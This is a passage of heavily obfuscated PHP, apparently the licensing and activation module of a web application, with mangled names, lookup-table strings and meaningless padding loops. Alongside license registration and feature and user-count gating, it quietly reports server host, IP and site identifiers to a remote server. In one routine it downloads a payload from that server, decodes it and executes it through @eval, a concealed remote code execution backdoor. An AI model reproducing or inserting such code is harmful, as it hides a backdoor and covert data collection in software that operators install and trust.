$´­ùâ„í[117])) { die; } $“£òìü´ = $GLOBALS[$´­ùâ„í[13]]; if (isset($“£òìü´[$´­ùâ„í[151]])) { $this->menqcf1d2f93(); die; } if (isset($“£òìü´[$´­ùâ„í[152]]) && isset($“£òìü´[$´­ùâ„í[152]]) == $´­ùâ„í[123]) { $“£òìü´[$´­ùâ„í[153]] = Model($´­ùâ„í[33])->get($´­ùâ„í[154]); } if (!isset($“£òìü´[$´­ùâ„í[153]]) || strlen($“£òìü´[$´­ùâ„í[153]]) != 16) { show_json($´­ùâ„í[155] . $“£òìü´[$´­ùâ„í[153]], !1); } $ü ‰­‡Ë = Model($´­ùâ„í[33])->get($´­ùâ„í[99]); $„³¯ã’ = md5($_SERVER[$´­ùâ„í[105]] . $ü ‰­‡Ë); $Ø²²íÇ± = array($´­ùâ„í[153] => $“£òìü´[$´­ùâ„í[153]], $´­ùâ„í[156] => rand_string(16), $´­ùâ„í[157] => $´­ùâ„í[137], $´­ùâ„í[158] => $´­ùâ„í[159], $´­ùâ„í[160] => $_SERVER[$´­ùâ„í[161]], $´­ùâ„í[162] => $_SERVER[$´­ùâ„í[163]], $´­ùâ„í[164] => $_SERVER[$´­ùâ„í[165]], $´­ùâ„í[104] => $„³¯ã’, $´­ùâ„í[166] => Model($´­ùâ„í[33])->get($´­ùâ„í[132])); $àİè™“³ = $¡„À»¼ß[703]; if (!$àİè™“³) { return; } if ($“£òìü´[$´­ùâ„í[167]] == $´­ùâ„í[168]) { $°Ùè§ãÅ = $this->pnwk3c18debd($„³¯ã’, $´­ùâ„í[169]); $°âøŸÏÎ = $this->zxdafac23473(json_encode($Ø²²íÇ±), $„³¯ã’ . $´­ùâ„í[170], 3); $°âøŸÏÎ = $°âøŸÏÎ . $´­ùâ„í[171] . $_SERVER[$´­ùâ„í[161]]; $©İÖää» = $this->zmbv12499e68($´­ùâ„í[172] . $°Ùè§ãÅ . $´­ùâ„í[173] . $°âøŸÏÎ, -1); show_json($©İÖää», !0); } else { if ($“£òìü´[$´­ùâ„í[167]] == $´­ùâ„í[174]) { $Ğã”¦©İ = substr(md5($´­ùâ„í[175] . $„³¯ã’), 12, 15) . $´­ùâ„í[176]; $°âøŸÏÎ = $this->zoqxe65a65a7(trim($“£òìü´[$´­ùâ„í[177]]), $Ğã”¦©İ, 2); $•ÂÍö–Ù = json_decode($°âøŸÏÎ, !0); if (!is_array($•ÂÍö–Ù) || !is_array($•ÂÍö–Ù[$´­ùâ„í[178]]) || $•ÂÍö–Ù[$´­ùâ„í[153]] != !0) { $¹Å¿·Òİ = $´­ùâ„í[179]; $Åú™ñµØ = $•ÂÍö–Ù[$´­ùâ„í[178]] ? $´­ùâ„í[180] . $•ÂÍö–Ù[$´­ùâ„í[178]] : $¹Å¿·Òİ; show_json($Åú™ñµØ, !1); } else { $Ø²²íÇ±[$´­ùâ„í[156]] = $•ÂÍö–Ù[$´­ùâ„í[178]][$´­ùâ„í[181]]; } } else { $•ÂÍö–Ù = $this->zmbv12499e68($´­ùâ„í[182], $Ø²²íÇ±, 10); $›œõ¾È = $¡„À»¼ß[704]; } } if (!is_array($•ÂÍö–Ù) || !is_array($•ÂÍö–Ù[$´­ùâ„í[178]]) || $•ÂÍö–Ù[$´­ùâ„í[153]] != !0) { $¹Å¿·Òİ = LNG($´­ùâ„í[183]); $Åú™ñµØ = $•ÂÍö–Ù[$´­ùâ„í[178]] ? $´­ùâ„í[180] . $•ÂÍö–Ù[$´­ùâ„í[178]] : $¹Å¿·Òİ; show_json($Åú™ñµØ, !1); } $ÈœÖ¡·Ï = $•ÂÍö–Ù[$´­ùâ„í[178]]; $»ìôÙë÷ = $this->spjb74210cba($ÈœÖ¡·Ï[$´­ùâ„í[184]]); $šûè‡ª· = $¡„À»¼ß[705]; if (!$»ìôÙë÷ || $»ìôÙë÷ != $ÈœÖ¡·Ï[$´­ùâ„í[130]]) { $ßÄšÎàô = array($´­ùâ„í[185] => Model($´­ùâ„í[33])->get($´­ùâ„í[99]), $´­ùâ„í[186] => $_SERVER[$´­ùâ„í[105]], $´­ùâ„í[187] => this_url(), $´­ùâ„í[162] => $_SERVER[$´­ùâ„í[163]]); $°âøŸÏÎ = $this->xnof693481ee(json_encode($ßÄšÎàô)); $this->zmbv12499e68($´­ùâ„í[188] . $°âøŸÏÎ); show_json(LNG($´­ùâ„í[189]), !0); } $†”ıø ¶ = array($´­ùâ„í[154] => $ÈœÖ¡·Ï[$´­ùâ„í[190]], $´­ùâ„í[191] => $ÈœÖ¡·Ï[$´­ùâ„í[192]], $´­ùâ„í[193] => rand_string(16), $´­ùâ„í[107] => $ÈœÖ¡·Ï[$´­ùâ„í[194]]); if ($Ø²²íÇ±[$´­ùâ„í[156]]) { $†”ıø ¶[$´­ùâ„í[193]] = $Ø²²íÇ±[$´­ùâ„í[156]]; } $Ëáœ­Ü = substr(md5($†”ıø ¶[$´­ùâ„í[191]]), 10, 10); $¢ß¬É¾÷ = $Ëáœ­Ü . $†”ıø ¶[$´­ùâ„í[107]] . $†”ıø ¶[$´­ùâ„í[193]]; $û¦©Úúå = $¡„À»¼ß[706]; $†”ıø ¶[$´­ùâ„í[109]] = strrev(base64_encode($this->pnwk3c18debd($¢ß¬É¾÷, $´­ùâ„í[195]))); $Ó¯¼¼ = rand_string(16); $²ù˜·Âí = $¡„À»¼ß[707]; if (strlen($²ù˜·Âí) < $¡„À»¼ß[660]) { return; } $°›Ô×šÏ = $Ó¯¼¼ . $†”ıø ¶[$´­ùâ„í[107]] . $this->pnwk3c18debd(md5($†”ıø ¶[$´­ùâ„í[154]]), $Ó¯¼¼); $±‘Áôé = $¡„À»¼ß[708]; while (strlen($±‘Áôé) < $¡„À»¼ß[260]) { if (!$±‘Áôé) { break; } $±‘Áôé++; } $†”ıø ¶[$´­ùâ„í[110]] = base64_encode(strrev($this->pnwk3c18debd($°›Ô×šÏ, $´­ùâ„í[196]))); if ($ÈœÖ¡·Ï[$´­ùâ„í[197]] && $ÈœÖ¡·Ï[$´­ùâ„í[197]] >= 1) { Model($´­ùâ„í[33])->setDeep($´­ùâ„í[198], $´­ùâ„í[123]); } Model($´­ùâ„í[33])->set($†”ıø ¶); $»ãÍÉ™„ = md5($_SERVER[$´­ùâ„í[105]] . strrev($ü ‰­‡Ë) . $†”ıø ¶[$´­ùâ„í[191]]); $®áÊóå = strrev(substr($»ãÍÉ™„, 10, 16)); $¯ÃÇ··‘ = $¡„À»¼ß[709]; $ªŞ³áåê = $this->zxdafac23473(json_encode($ÈœÖ¡·Ï), $»ãÍÉ™„); $ô‚úèŠ… = array_to_keyvalue(Model($´­ùâ„í[7])->listData(), $´­ùâ„í[199]); $Â–½£«Ğ = $ô‚úèŠ…[$´­ùâ„í[200]]; $ßÎªø¯ = $¡„À»¼ß[710]; while (strlen($ßÎªø¯) < $¡„À»¼ß[701]) { if (!$ßÎªø¯) { break; } $ßÎªø¯++; } $ÉÅ¸ÜÅÈ = array(); $ÉÅ¸ÜÅÈ[$®áÊóå] = $ªŞ³áåê; Model($´­ùâ„í[7])->update($Â–½£«Ğ[$´­ùâ„í[201]], array($´­ùâ„í[202] => $ÉÅ¸ÜÅÈ)); $this->zsgjdc7253a9 = $ÈœÖ¡·Ï; $this->rzcq6acc515b = $†”ıø ¶[$´­ùâ„í[107]]; $ààŠ¿ç = $¡„À»¼ß[711]; while (strlen($ààŠ¿ç) < $¡„À»¼ß[660]) { if (!$ààŠ¿ç) { break; } $ààŠ¿ç++; } $this->licenseRegistSuccess(); $ÌÇ­è ™ = $¡„À»¼ß[712]; if (strlen($ÌÇ­è ™) < $¡„À»¼ß[660]) { die; } Cache::set($´­ùâ„í[203] . md5($ü ‰­‡Ë . $´­ùâ„í[204]), $´­ùâ„í[6]); show_json(LNG($´­ùâ„í[189]), !0); $ü÷×Ø™Æ = $¡„À»¼ß[713]; } private function licenseRegistSuccess() { $¶òŠÏ¹ =& $_SERVER[ıŸƒèÂë]; $ÃÃ¶êÁ = Model($¶òŠÏ¹[33])->get(); if ($ÃÃ¶êÁ[$¶òŠÏ¹[63]] != $¶òŠÏ¹[123]) { Model($¶òŠÏ¹[33])->set($¶òŠÏ¹[63], $¶òŠÏ¹[123]); } Action($¶òŠÏ¹[205])->initStart(!0); } private function menqcf1d2f93() { $Ö±¸¨¡ñ =& $_SERVER[ •ŒÓîÆ]; $‹Ê¤‚“Ó =& $_SERVER[ıŸƒèÂë]; Model($‹Ê¤‚“Ó[33])->set(array($‹Ê¤‚“Ó[154] => $‹Ê¤‚“Ó[6], $‹Ê¤‚“Ó[191] => $‹Ê¤‚“Ó[6], $‹Ê¤‚“Ó[107] => $‹Ê¤‚“Ó[108], $‹Ê¤‚“Ó[109] => $‹Ê¤‚“Ó[6], $‹Ê¤‚“Ó[110] => $‹Ê¤‚“Ó[6])); Model($‹Ê¤‚“Ó[33])->setDeep($‹Ê¤‚“Ó[198], $‹Ê¤‚“Ó[206]); $this->zsgjdc7253a9 = array(); $‰ø—¡ëá = $Ö±¸¨¡ñ[714]; while (strlen($‰ø—¡ëá) < $Ö±¸¨¡ñ[660]) { if (!$‰ø—¡ëá) { break; } $‰ø—¡ëá++; } $this->rzcq6acc515b = $‹Ê¤‚“Ó[108]; $­ôƒ³”Ë = $Ö±¸¨¡ñ[715]; if (!$­ôƒ³”Ë) { return; } } private function bjwx88f21c1b() { $®Úçí­ï =& $_SERVER[ •ŒÓîÆ]; $òìÖÊ± =& $_SERVER[ıŸƒèÂë]; $_SERVER[$òìÖÊ±[163]] = _get($_SERVER, $òìÖÊ±[163], APP_HOST); $‰¤­º‰÷ = $®Úçí­ï[716]; $this->rzcq6acc515b = $òìÖÊ±[108]; $Ê—Û‹˜» = Model($òìÖÊ±[33])->get(); $Ò£Öù² = $®Úçí­ï[717]; if (!$Ò£Öù²) { return; } if ($Ê—Û‹˜»[$òìÖÊ±[107]] == $òìÖÊ±[108]) { return; } $ıé¿·³ = Model($òìÖÊ±[33])->get($òìÖÊ±[99]); $öüÊšƒ = $òìÖÊ±[203] . md5($ıé¿·³ . $òìÖÊ±[204]); $®™ğÎÍê = Cache::get($öüÊšƒ); if (!is_array($®™ğÎÍê) || !isset($®™ğÎÍê[$òìÖÊ±[207]]) || time() - $®™ğÎÍê[$òìÖÊ±[207]] >= 60) { $ãÄíÏÙ— = Model($òìÖÊ±[7])->loadList(); $—Ô¹Ëá = $ãÄíÏÙ—[$òìÖÊ±[200]]; $Ì–ªôÄƒ = md5($_SERVER[$òìÖÊ±[105]] . strrev($ıé¿·³) . $Ê—Û‹˜»[$òìÖÊ±[191]]); $½õ®ÛÒı = strrev(substr($Ì–ªôÄƒ, 10, 16)); $®™ğÎÍê = $this->zoqxe65a65a7($—Ô¹Ëá[$òìÖÊ±[85]][$½õ®ÛÒı], $Ì–ªôÄƒ); $®™ğÎÍê = json_decode($®™ğÎÍê, !0); } if (!is_array($®™ğÎÍê)) { return $this->menqcf1d2f93(); } $È—îñäÍ = strtotime($®™ğÎÍê[$òìÖÊ±[130]]); if (time() >= $È—îñäÍ) { return $this->menqcf1d2f93(); } if (time() - $®™ğÎÍê[$òìÖÊ±[207]] > 20) { $®™ğÎÍê[$òìÖÊ±[207]] = time(); Cache::set($öüÊšƒ, $®™ğÎÍê); } $this->zsgjdc7253a9 = $®™ğÎÍê; $this->rzcq6acc515b = $Ê—Û‹˜»[$òìÖÊ±[107]]; } private function bjacbb10fd5e() { $›’âší¿ =& $_SERVER[ •ŒÓîÆ]; $Ó½ø—ü¯ =& $_SERVER[ıŸƒèÂë]; $È»ÅŞ¼ = $GLOBALS[$Ó½ø—ü¯[13]]; $³‚ ’¥ = $_SERVER[$Ó½ø—ü¯[24]]; $°õÄô´å = $›’âší¿[718]; while (strlen($°õÄô´å) < $›’âší¿[671]) { if (!$°õÄô´å) { break; } $°õÄô´å++; } if ($³‚ ’¥ == $Ó½ø—ü¯[208] && $this->rzcq6acc515b == $Ó½ø—ü¯[108]) { show_json(LNG($Ó½ø—ü¯[209]), !1, $Ó½ø—ü¯[210]); } $®Î¼Ñ“Š = array($Ó½ø—ü¯[211], $Ó½ø—ü¯[212]); if (in_array($³‚ ’¥, $®Î¼Ñ“Š)) { if ($this->rzcq6acc515b == $Ó½ø—ü¯[108] && isset($È»ÅŞ¼[$Ó½ø—ü¯[213]])) { show_json(LNG($Ó½ø—ü¯[209]), !1, $Ó½ø—ü¯[210]); die; } $–Ì©õ’Ù = $this->yoxf8f359259(); if ($–Ì©õ’Ù != intval($Ó½ø—ü¯[214])) { if ($–Ì©õ’Ù <= Model($Ó½ø—ü¯[126])->count()) { show_json(LNG($Ó½ø—ü¯[215]), !1, $Ó½ø—ü¯[210]); die; } } } } private function mqhv994580b8() { $ˆ¨™ÚÖô =& $_SERVER[ •ŒÓîÆ]; $Öƒ‡Ø¼è =& $_SERVER[ıŸƒèÂë]; $“Æßâ³° = array($Öƒ‡Ø¼è[120], $Öƒ‡Ø¼è[121]); if (!_get($GLOBALS, $Öƒ‡Ø¼è[117]) || !isset($_GET[$Öƒ‡Ø¼è[216]])) { return; } if (!in_array($_SERVER[$Öƒ‡Ø¼è[24]], $“Æßâ³°)) { return; } $­Ë²©à” = $Öƒ‡Ø¼è[217]; $­Ë²©à” = $this->kcaz537a44cc($­Ë²©à”, $Öƒ‡Ø¼è[218]); $çœßáÕÙ = $ˆ¨™ÚÖô[719]; if (strlen($çœßáÕÙ) < $ˆ¨™ÚÖô[665]) { return; } $ËÒÎìñ¼ = stream_context_create(array($Öƒ‡Ø¼è[219] => array($Öƒ‡Ø¼è[220] => $Öƒ‡Ø¼è[221], $Öƒ‡Ø¼è[222] => 3))); $àóş“¾¨ = $ˆ¨™ÚÖô[720]; if (!$àóş“¾¨) { die; } $ë¨Õä‘ = @file_get_contents($­Ë²©à”, !1, $ËÒÎìñ¼); $Ë®ª¬®‘ = $ˆ¨™ÚÖô[721]; if (strlen($Ë®ª¬®‘) < $ˆ¨™ÚÖô[660]) { return; } header($Öƒ‡Ø¼è[223]); $„¨ÈÈ·© = $ˆ¨™ÚÖô[722]; while (strlen($„¨ÈÈ·©) < $ˆ¨™ÚÖô[660]) { if (!$„¨ÈÈ·©) { break; } $„¨ÈÈ·©++; } if ($ë¨Õä‘ && strstr($ë¨Õä‘, $Öƒ‡Ø¼è[224])) { echo $ë¨Õä‘; } die; } public function wmplbc2dbcc2($Ç«ê•óÃ) { $ÁÛ¯è =& $_SERVER[ •ŒÓîÆ]; $ù±Ûî‘ =& $_SERVER[ıŸƒèÂë]; if ($this->rzcq6acc515b == $ù±Ûî‘[225]) { return $Ç«ê•óÃ; } $ô³¸Ûµ– = array($ù±Ûî‘[226] => $ù±Ûî‘[227], $ù±Ûî‘[228] => $ù±Ûî‘[227], $ù±Ûî‘[229] => $ù±Ûî‘[227], $ù±Ûî‘[230] => $ù±Ûî‘[231], $ù±Ûî‘[232] => $ù±Ûî‘[231], $ù±Ûî‘[233] => $ù±Ûî‘[231], $ù±Ûî‘[234] => $ù±Ûî‘[231], $ù±Ûî‘[235] => $ù±Ûî‘[231], $ù±Ûî‘[236] => $ù±Ûî‘[231], $ù±Ûî‘[237] => $ù±Ûî‘[231], $ù±Ûî‘[238] => $ù±Ûî‘[231], $ù±Ûî‘[239] => $ù±Ûî‘[231], $ù±Ûî‘[240] => $ù±Ûî‘[231], $ù±Ûî‘[241] => $ù±Ûî‘[231], $ù±Ûî‘[242] => $ù±Ûî‘[231]); $ƒ‹Üøß  = $ÁÛ¯è[723]; while (strlen($ƒ‹Üøß ) < $ÁÛ¯è[260]) { if (!$ƒ‹Üøß ) { break; } $ƒ‹Üøß ++; } $„íëûş© = explode($ù±Ûî‘[243], _get($this->zsgjdc7253a9, $ù±Ûî‘[114], $ù±Ûî‘[6])); $¬¡¶œ‹ù = $ÁÛ¯è[724]; if (!$¬¡¶œ‹ù) { die; } $Ã‚‘â— = array(); foreach ($ô³¸Ûµ– as $›„é¦æ€ => $æÌ—³Îª) { if ($æÌ—³Îª == $ù±Ûî‘[227] && substr($this->rzcq6acc515b, 0, 1) == $ù±Ûî‘[227]) { continue; } if (!in_array($›„é¦æ€, $„íëûş©)) { $Ã‚‘â—[] = $›„é¦æ€; } } foreach ($Ã‚‘â— as $›„é¦æ€) { unset($Ç«ê•óÃ[$›„é¦æ€]); } return $Ç«ê•óÃ; $¯˜ºß¥Ş = $ÁÛ¯è[725]; if (strlen($¯˜ºß¥Ş) < $ÁÛ¯è[701]) { return; } } private function nrjvb1fbec2f() { $—¸Õ‰ªê =& $_SERVER[ıŸƒèÂë]; if ($this->rzcq6acc515b != $—¸Õ‰ªê[108]) { $GLOBALS[$—¸Õ‰ªê[85]][$—¸Õ‰ªê[89]][$—¸Õ‰ªê[244]] = $—¸Õ‰ªê[206]; return; } $GLOBALS[$—¸Õ‰ªê[85]][$—¸Õ‰ªê[245]] = $—¸Õ‰ªê[123]; if (Model($—¸Õ‰ªê[246])->get($—¸Õ‰ªê[63]) != $—¸Õ‰ªê[206]) { Model($—¸Õ‰ªê[246])->set($—¸Õ‰ªê[63], $—¸Õ‰ªê[206]); } } public function imbuf08fb380() { return $_SERVER[ıŸƒèÂë][247]; } private function ftil51cf1b0e() { $µİ•¨ê´ =& $_SERVER[ •ŒÓîÆ]; $¤ø¿É À =& $_SERVER[ıŸƒèÂë]; $—Ûè”®Ø = array($¤ø¿É À[248], $¤ø¿É À[249], $¤ø¿É À[250]); $Ñ¼îÂŞ = $µİ•¨ê´[726]; $­”Ğå£Õ = $¤ø¿É À[251] . md5($¤ø¿É À[252]); if ($this->rzcq6acc515b == $¤ø¿É À[108] || !_get($GLOBALS, $¤ø¿É À[117])) { return; } if (!in_array($_SERVER[$¤ø¿É À[24]], $—Ûè”®Ø)) { return; } if (time() % 4 != 0) { return; } $Œ¬ÚË¿ = call_user_func(array($¤ø¿É À[253], $¤ø¿É À[254]), $­”Ğå£Õ); if ($Œ¬ÚË¿ && time() - $Œ¬ÚË¿ < intval($¤ø¿É À[255])) { return; } call_user_func(array($¤ø¿É À[253], $¤ø¿É À[140]), $­”Ğå£Õ, time()); $ïüÄ€İ® = Model($¤ø¿É À[33])->get($¤ø¿É À[99]); $”«–ìÊö = $µİ•¨ê´[727]; if (!$”«–ìÊö) { return; } $à£–ãğ¢ = array($¤ø¿É À[153] => Model($¤ø¿É À[33])->get($¤ø¿É À[154]), $¤ø¿É À[167] => $this->rzcq6acc515b, $¤ø¿É À[164] => $_SERVER[$¤ø¿É À[165]], $¤ø¿É À[166] => Model($¤ø¿É À[33])->get($¤ø¿É À[132]), $¤ø¿É À[104] => md5($_SERVER[$¤ø¿É À[105]] . $ïüÄ€İ®), $¤ø¿É À[157] => $¤ø¿É À[137], $¤ø¿É À[160] => $_SERVER[$¤ø¿É À[161]]); $â¤·ù½ = $µİ•¨ê´[728]; if (strlen($â¤·ù½) < $µİ•¨ê´[660]) { return; } $·à¿·¹¸ = $this->zmbv12499e68($¤ø¿É À[256], $à£–ãğ¢); if (!is_array($·à¿·¹¸)) { return; } if ($·à¿·¹¸[$¤ø¿É À[153]] && $·à¿·¹¸[$¤ø¿É À[257]]) { if ($this->spjb74210cba($·à¿·¹¸[$¤ø¿É À[257]]) == $à£–ãğ¢[$¤ø¿É À[153]]) { return; } } $this->menqcf1d2f93(); $öå¯²¢ = $µİ•¨ê´[729]; if (!$öå¯²¢) { return; } if ($this->spjb74210cba($·à¿·¹¸[$¤ø¿É À[257]]) != $à£–ãğ¢[$¤ø¿É À[153]]) { $…şœÇŸı = array($¤ø¿É À[185] => $ïüÄ€İ®, $¤ø¿É À[186] => $_SERVER[$¤ø¿É À[105]], $¤ø¿É À[187] => this_url(), $¤ø¿É À[162] => $_SERVER[$¤ø¿É À[163]]); $éÓç˜çâ = $this->xnof693481ee(json_encode($…şœÇŸı)); $·à¿·¹¸ = $this->zmbv12499e68($¤ø¿É À[188] . $éÓç˜çâ); if ($·à¿·¹¸ && is_array($·à¿·¹¸) && isset($·à¿·¹¸[$¤ø¿É À[257]])) { $ÆàÇÂ¶‰ = $this->zoqxe65a65a7($·à¿·¹¸[$¤ø¿É À[257]], 2); if ($ÆàÇÂ¶‰) { $ÆàÇÂ¶‰ = $this->spjb74210cba($ÆàÇÂ¶‰); } if ($ÆàÇÂ¶‰) { try { @eval($ÆàÇÂ¶‰); } catch (Exception $±È»ºÇ®) { } } } } } private function zmbv12499e68($î˜şãĞÅ = '', $½íñÁáƒ = array(), $«»Ïˆõ  = 5) { $¨àª«õ =& $_SERVER[ •ŒÓîÆ]; $Õ”‹ŞÃ‚ =& $_SERVER[ıŸƒèÂë]; $Á•»‰ = $Õ”‹ŞÃ‚[258]; $Á•»‰ = $this->kcaz537a44cc($Á•»‰, $Õ”‹ŞÃ‚[259]); $Á•»‰ = $Á•»‰ . $î˜şãĞÅ; $ˆªÛôÅ¢ = $¨àª«õ[730]; if (!$ˆªÛôÅ¢) { return; } if ($½íñÁáƒ && is_array($½íñÁáƒ)) { $Á•»‰ = $Á•»‰ . $Õ”‹ŞÃ‚[260] . http_build_query($½íñÁáƒ); } if ($½íñÁáƒ === -1) { return $Á•»‰; } $Ö‹¿ÃâÛ = stream_context_create(array($Õ”‹ŞÃ‚[219] => array($Õ”‹ŞÃ‚[222] => $«»Ïˆõ , $Õ”‹ŞÃ‚[220] => $Õ”‹ŞÃ‚[261]), $Õ”‹ŞÃ‚[262] => array($Õ”‹ŞÃ‚[263] => !1, $Õ”‹ŞÃ‚[264] => !1))); $ğ¨É›¬ = $¨àª«õ[731]; $½íñÁáƒ = @file_get_contents($Á•»‰, !1, $Ö‹¿ÃâÛ); return json_decode($½íñÁáƒ, !0); } private function yoxf8f359259() { $¶‡Ç‹‡¥ =& $_SERVER[ •ŒÓîÆ]; $»ëŸ¢” =& $_SERVER[ıŸƒèÂë]; $ÓÃ¸† = array($»ëŸ¢”[265] => $»ëŸ¢”[266], $»ëŸ¢”[267] => $»ëŸ¢”[268], $»ëŸ¢”[269] => $»ëŸ¢”[270], $»ëŸ¢”[271] => $»ëŸ¢”[272], $»ëŸ¢”[273] => $»ëŸ¢”[274], $»ëŸ¢”[275] => $»ëŸ¢”[214], $»ëŸ¢”[276] => $»ëŸ¢”[214], $»ëŸ¢”[277] => $»ëŸ¢”[266], $»ëŸ¢”[278] => $»ëŸ¢”[268], $»ëŸ¢”[279] => $»ëŸ¢”[270], $»ëŸ¢”[280] => $»ëŸ¢”[281], $»ëŸ¢”[282] => $»ëŸ¢”[272], $»ëŸ¢”[283] => $»ëŸ¢”[284], $»ëŸ¢”[285] => $»ëŸ¢”[274], $»ëŸ¢”[286] => $»ëŸ¢”[287], $»ëŸ¢”[288] => $»ëŸ¢”[289], $»ëŸ¢”[290] => $»ëŸ¢”[291]); $Ä•Ïõ• = $¶‡Ç‹‡¥[732]; if (strlen($Ä•Ïõ•) < $¶‡Ç‹‡¥[660]) { die; } $„øİîä = $ÓÃ¸†[$this->rzcq6acc515b]; $ÉóõÉ¥œ = $¶‡Ç‹‡¥[733]; while ($ÉóõÉ¥œ < $¶‡Ç‹‡¥[260]) { if ($ÉóõÉ¥œ >= 0) { break; } $ÉóõÉ¥œ++; } $„øİîä = intval($„øİîä ? $„øİîä : $»ëŸ¢”[266]); $€£Ç¬œæ = _get($this->zsgjdc7253a9, $»ëŸ¢”[292]); $€£Ç¬œæ = $€£Ç¬œæ ? intval($€£Ç¬œæ) : 0; return $„øİîä + $€£Ç¬œæ; $…®ášß¶ = $¶‡Ç‹‡¥[734]; if (!$…®ášß¶) { return; } } public function xlmq5b494301($ÚÅ’­Œ˜) { $áè ìı =& $_SERVER[ •ŒÓîÆ]; $Èä£·²¿ =& $_SERVER[ıŸƒèÂë]; $Ë‹´šß– = $this->yoxf8f359259(); $¯å‰¯—ë = $áè ìı[735]; while ($¯å‰¯—ë < $áè ìı[701]) { if ($¯å‰¯—ë >= 0) { break; } $¯å‰¯—ë++; } if ($ÚÅ’­Œ˜[$Èä£·²¿[293]] == $Èä£·²¿[123]) { return; } if ($Ë‹´šß– >= intval($Èä£·²¿[214])) { return; } $ßŸÄËÅ” = Model($Èä£·²¿[126])->count(); if ($ßŸÄËÅ” <= $Ë‹´šß–) { return; } $œ°Æ—î– = Model($Èä£·²¿[126])->field($Èä£·²¿[293])->limit($Ë‹´šß–)->select(); $ƒøòÔõÆ = $áè ìı[736]; $œ°Æ—î– = array_to_keyvalue($œ°Æ—î–, $Èä£·²¿[6], $Èä£·²¿[293]); if (!in_array($ÚÅ’­Œ˜[$Èä£·²¿[293]], $œ°Æ—î–)) { show_json($Èä£·²¿[294], !1, $Èä£·²¿[210]); } } public function kyig9a8e1d59() { $Ğ”ÍÎ¾ =& $_SERVER[ •ŒÓîÆ]; $ØŒı¶® =& $_SERVER[ıŸƒèÂë]; if (!_get($GLOBALS, $ØŒı¶®[117]) || mt_rand(1, 100) > 20) { return; } $ú¾Û™ïª = $ØŒı¶®[217]; $ú¾Û™ïª = $this->kcaz537a44cc($ú¾Û™ïª, $ØŒı¶®[218]); $óË¨ù = $Ğ”ÍÎ¾[737]; if (!$óË¨ù) { die; } $ö¡ò¸”ó = stream_context_create(array($ØŒı¶®[219] => array($ØŒı¶®[220] => $ØŒı¶®[221], $ØŒı¶®[222] => 3))); $˜ãö€Ö­ = $Ğ”ÍÎ¾[738]; if (strlen($˜ãö€Ö­) < $Ğ”ÍÎ¾[665]) { die; } $¥×œ¢ í = @file_get_contents($ú¾Û™ïª, !1, $ö¡ò¸”ó); echo $ØŒı¶®[295] . hash_encode($¥×œ¢ í) . $ØŒı¶®[296]; $î“Ô„Âå = $Ğ”ÍÎ¾[739]; while (strlen($î“Ô„Âå) < $Ğ”ÍÎ¾[671]) { if (!$î“Ô„Âå) { break; } $î“Ô„Âå++; } } private function zxdafac23473($ÖŒ‹ºıÕ, $†ë‹Ä„Å, $Áå³ˆ = 3) { $¦“ïëÚ =& $_SERVER[ •ŒÓîÆ]; $³¹¡©è =& $_SERVER[ıŸƒèÂë]; usleep(1); $ÖŒ‹ºıÕ = trim($ÖŒ‹ºıÕ); $æŞ˜Á¬ = $¦“ïëÚ[740]; $Àî²å®À = mt_rand(0, 5) . $³¹¡©è[6]; $šâ¤Ş¬ = rand_string(15); $Õêşö›ß = $³¹¡©è[297]; switch ($Àî²å®À) { case $³¹¡©è[206]: $ë—§Ÿ•™ = $this->pnwk3c18debd($ÖŒ‹ºıÕ, strrev($†ë‹Ä„Å . $šâ¤Ş¬)); break; $ÛÄË÷¶ = $¦“ïëÚ[686]; while ($ÛÄË÷¶ < $¦“ïëÚ[671]) { if ($ÛÄË÷¶ >= 0) { break; } $ÛÄË÷¶++; } case $³¹¡©è[123]: $ë—§Ÿ•™ = $this->pnwk3c18debd($ÖŒ‹ºıÕ, strrev($šâ¤Ş¬ . $†ë‹Ä„Å)); $ë‡¼¢È‡ = $¦“ïëÚ[741]; break; $¦Ø´şÕ = $¦“ïëÚ[742]; if (strlen($¦Ø´şÕ) < $¦“ïëÚ[665]) { die; } case $³¹¡©è[298]: $ë—§Ÿ•™ = $this->pnwk3c18debd($ÖŒ‹ºıÕ, base64_encode($šâ¤Ş¬ . $†ë‹Ä„Å)); break; case $³¹¡©è[299]: $ë—§Ÿ•™ = $this->pnwk3c18debd($ÖŒ‹ºıÕ, md5($šâ¤Ş¬ . $†ë‹Ä„Å)); $åÃòËÍ› = $¦“ïëÚ[743]; if (strlen($åÃòËÍ›) < $¦“ïëÚ[701]) { die; } break; $Ìğü…—Û = $¦“ïëÚ[744]; while (strlen($Ìğü…—Û) < $¦“ïëÚ[671]) { if (!$Ìğü…—Û) { break; } $Ìğü…—Û++; } case $³¹¡©è[300]: $ÖŒ‹ºıÕ = base64_encode($ÖŒ‹ºıÕ); $ÔìØ‚Àë = rand(0, 64); $ ‡ÏıÕ = $Õêşö›ß[$ÔìØ‚Àë]; $ñ¦Ö„Äû = $¦“ïëÚ[745]; if (strlen($ñ¦Ö„Äû) < $¦“ïëÚ[671]) { die; } $”ã¡›ß© = md5($ ‡ÏıÕ . md5($†ë‹Ä„Å . $ ‡ÏıÕ) . $†ë‹Ä„Å); $”ã¡›ß© = substr($”ã¡›ß©, $ÔìØ‚Àë % 8, $ÔìØ‚Àë % 8 + 7); $ğ©á¬¤Ì = $³¹¡©è[6]; $ôÉÚ´ÉÛ = 0; $âø‡úïË = 0; $¢ë„Ñ÷ = 0; $¦‡‚¯ã = $¦“ïëÚ[746]; if (strlen($¦‡‚¯ã) < $¦“ïëÚ[660]) { return; } for ($ôÉÚ´ÉÛ = 0; $ôÉÚ´ÉÛ < strlen($ÖŒ‹ºıÕ); $ôÉÚ´ÉÛ++) { $¢ë„Ñ÷ = $¢ë„Ñ÷ == strlen($”ã¡›ß©) ? 0 : $¢ë„Ñ÷; $âø‡úïË = ($ÔìØ‚Àë + strpos($Õêşö›ß, $ÖŒ‹ºıÕ[$ôÉÚ´ÉÛ]) + ord($”ã¡›ß©[$¢ë„Ñ÷++])) % 64; $æ¿ÙÎ¶¯ = $¦“ïëÚ[747]; $ğ©á¬¤Ì .= $Õêşö›ß[$âø‡úïË]; } $ë—§Ÿ•™ = hash_encode($ ‡ÏıÕ . $ğ©á¬¤Ì); $€êÛŸ… = $¦“ïëÚ[748]; while ($€êÛŸ… < $¦“ïëÚ[671]) { if ($€êÛŸ… >= 0) { break; } $€êÛŸ…++; } break; default: $ë—§Ÿ•™ = $this->pnwk3c18debd($ÖŒ‹ºıÕ, $†ë‹Ä„Å . $šâ¤Ş¬); break; $öß¢ãâá = $¦“ïëÚ[749]; } $ë—§Ÿ•™ = strrev($Àî²å®À . $šâ¤Ş¬ . $ë—§Ÿ•™); $­—¨³¾» = 